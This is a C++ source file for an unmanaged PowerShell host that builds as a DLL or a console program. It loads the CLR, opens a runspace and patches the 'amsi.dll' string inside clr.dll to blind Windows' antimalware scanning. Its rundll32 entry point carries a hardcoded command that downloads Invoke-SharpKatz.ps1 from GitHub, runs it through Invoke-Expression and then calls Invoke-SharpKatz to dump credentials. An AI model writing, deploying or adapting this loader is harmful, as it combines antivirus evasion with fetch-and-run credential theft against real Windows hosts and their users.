#include "powershell.h"
#include "patch.h"
#include "clr.h"
#include <string>
#include <mutex>


#ifdef _WINDLL
BOOL APIENTRY DllMain(
	HMODULE hModule,
	DWORD   ul_reason_for_call,
	LPVOID  lpReserved
) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_PROCESS_DETACH:
		break;

	default:
		break;
	}

	return TRUE;
}

#define PSH_OK              0
#define PSH_ERR_INIT       -1
#define PSH_ERR_RUNSPACE   -2
#define PSH_ERR_NOT_INIT   -3
#define PSH_ERR_INVALID    -4

static std::mutex g_mutex;
static CLR* g_clr = nullptr;
static RunspaceContext* g_ctx = nullptr;
static std::wstring g_lastError;

static void PSH_SetLastError(const std::wstring& msg) {
    std::lock_guard<std::mutex> lock(g_mutex);
    g_lastError = msg;
}

extern "C" __declspec(dllexport) int PSH_Initialize() {
    std::lock_guard<std::mutex> lock(g_mutex);

    if (g_clr != nullptr) {
        return PSH_OK;
    }

    g_clr = new CLR();
    if (!g_clr->InitCLR()) {
        PSH_SetLastError(L"Failed to init CLR");
        delete g_clr;
        g_clr = nullptr;
        return PSH_ERR_INIT;
    }

    g_ctx = new RunspaceContext();
    if (!InitRunspace(*g_clr, g_ctx)) {
        PSH_SetLastError(L"Failed to initialize runspace");
        delete g_ctx;
        g_ctx = nullptr;
        g_clr->FreeCLR();
        delete g_clr;
        g_clr = nullptr;
        return PSH_ERR_RUNSPACE;
    }

    Patch(*g_clr);

    return PSH_OK;
}

extern "C" __declspec(dllexport) int PSH_Execute(const wchar_t* command, wchar_t* outBuf, int outSize) {
    std::lock_guard<std::mutex> lock(g_mutex);

    if (g_clr == nullptr || g_ctx == nullptr) {
        PSH_SetLastError(L"PSH_Execute called before PSH_Initialize");
        return PSH_ERR_NOT_INIT;
    }

    if (command == nullptr || outBuf == nullptr || outSize <= 0) {
        PSH_SetLastError(L"Invalid argument");
        return PSH_ERR_INVALID;
    }

    outBuf[0] = L'\0';

    std::wstring cmd(command);
    if (cmd == L"exit" || cmd == L"quit") {
        return PSH_OK;
    }

    std::wstring out;
    if (!InvokeInRunspace(*g_clr, g_ctx, cmd, &out)) {
        PSH_SetLastError(L"InvokeInRunspace failed");
    }

    int needed = (int)out.size();
    int toCopy = (needed < outSize - 1) ? needed : (outSize - 1);
    if (toCopy > 0) {
        wcsncpy_s(outBuf, outSize, out.c_str(), toCopy);
    }
    outBuf[toCopy] = L'\0';

    return PSH_OK;
}

extern "C" __declspec(dllexport) void PSH_Cleanup() {
    std::lock_guard<std::mutex> lock(g_mutex);

    if (g_ctx != nullptr) {
        CloseRunspace(g_ctx);
        delete g_ctx;
        g_ctx = nullptr;
    }

    if (g_clr != nullptr) {
        g_clr->FreeCLR();
        delete g_clr;
        g_clr = nullptr;
    }

    g_lastError.clear();
}

extern "C" __declspec(dllexport) const wchar_t* PSH_GetLastError() {
    return g_lastError.c_str();
}

// Entry: full init + invoke + show output in MessageBox
// Usage: rundll32 PowershellHosting.dll,Init
extern "C" __declspec(dllexport) void CALLBACK Init() {
    //const wchar_t* cmd = L"[System.Net.Dns]::GetHostAddresses('google.com')";
    const wchar_t* cmd = L"Invoke-RestMethod -Uri \"https://github.com/S3cur3Th1sSh1t/PowerSharpPack/raw/refs/heads/master/PowerSharpBinaries/Invoke-SharpKatz.ps1\" -UseBasicParsing | Invoke-Expression; Invoke-SharpKatz";

    // 1) Init (CLR + Runspace + Patch)
    int rc = PSH_Initialize();
    if (rc != PSH_OK) {
        std::string err;
        int n = WideCharToMultiByte(CP_ACP, 0, g_lastError.c_str(), -1, NULL, 0, NULL, NULL);
        if (n > 0) {
            err.resize(n - 1);
            WideCharToMultiByte(CP_ACP, 0, g_lastError.c_str(), -1, &err[0], n, NULL, NULL);
        }
        MessageBoxA(NULL, err.c_str(), "PSH_Initialize failedx", MB_ICONERROR);
        return;
    }

    // 2) Invoke
    std::wstring out;
    if (!InvokeInRunspace(*g_clr, g_ctx, std::wstring(cmd), &out)) {
        PSH_SetLastError(L"InvokeInRunspace failed");
    }

    // 3) Show output in MessageBox (truncate to 4000 wide-chars to fit)
    std::wstring preview = out.size() > 4000 ? out.substr(0, 4000) + L"\n[...truncated]" : out;
    MessageBoxW(NULL, preview.c_str(), L"PSH output", MB_ICONINFORMATION);
}


#else
#include "hwbp_veh.h"

#include <Windows.h>
#include <cstdint>
#include <cstring>

int main() {
	std::wstring input;

	// Fix: Enable sync between C++ streams and C stdio
	std::ios_base::sync_with_stdio(true);
	std::wcout << std::flush;
	std::cout << std::flush;

	CLR clr;

	if (!clr.InitCLR()) {
		wprintf(L"[!] Failed to init CLR.\n");
		return 0;
	}


    //getchar();
    PVOID lpClrAddr = GetModuleHandleA("clr.dll");
    if (!lpClrAddr) {
        PRINT_ERROR("GetModuleHandleA");
        return 0;
    }

    wchar_t patchAmsi = L'H';
    LPVOID addrAmsi = (LPVOID)FindFirstStringW((uintptr_t)lpClrAddr, 0x9A0000, L"amsi.dll");
    if (addrAmsi) {
        DEBUG("Patch string amsi dll");
        PatchProcedure(addrAmsi, (BYTE*)&patchAmsi, sizeof(char));
    }

    //const char* patch = "AmsiScanString";
    //LPVOID addr = (LPVOID)FindFirstString((uintptr_t)lpClrAddr, 0x9A0000, "AmsiInitialize");
    //if (addr) {
    //    DEBUG("Patch string AmsiInitialize");
    //    std::cout << "Patch string AmsiInitialize" << addr << std::endl;
    //    PatchProcedure(addr, (BYTE*)patch, strlen(patch));
    //}


    // 
	// Initialize runspace ONCE at startup
	RunspaceContext ctx;
	if (!InitRunspace(clr, &ctx)) {
		wprintf(L"[!] Failed to initialize runspace\n");
		return 0;
	}

    //PatchEtw();
	// Interactive loop - runspace stays open
	while (1) {
		std::cout << "PS > " << std::flush;
		std::getline(std::wcin, input);

		// Exit on "exit" command
		if (input == L"exit" || input == L"quit") {
			break;
		}

		std::wstring out;
		InvokeInRunspace(clr, &ctx, input, &out);

		// Convert wstring to string using WideCharToMultiByte
		if (!out.empty()) {
			int size_needed = WideCharToMultiByte(CP_ACP, 0, out.c_str(), -1, NULL, 0, NULL, NULL);
			if (size_needed > 0) {
				std::string out_str(size_needed - 1, '\0');
				WideCharToMultiByte(CP_ACP, 0, out.c_str(), -1, &out_str[0], size_needed, NULL, NULL);
				std::cout << out_str << std::endl;
			}
		}
	}

	// Close runspace when exiting
	CloseRunspace(&ctx);

	return 0;
}

#endif